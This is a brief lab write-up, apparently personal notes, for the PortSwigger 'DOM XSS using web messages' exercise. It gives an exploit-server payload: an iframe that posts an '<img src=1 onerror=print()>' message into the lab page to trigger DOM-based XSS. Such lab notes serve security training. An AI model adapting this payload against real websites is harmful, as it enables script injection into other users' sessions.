# DOM XSS using web messages
Lab URL :- 
`https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages`

![image](https://user-images.githubusercontent.com/60841283/153745543-5af9d7cb-9b39-479e-ba55-e04057a96b46.png)

Payload in exploit server (in Body section) :-
```html
<iframe src="https://ac301f9b1e366bb9c074daf400b800c0.web-security-academy.net/#" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
```

![image](https://user-images.githubusercontent.com/60841283/153745467-9cb2d3d7-44e0-4538-b303-1c0ae491d21d.png)
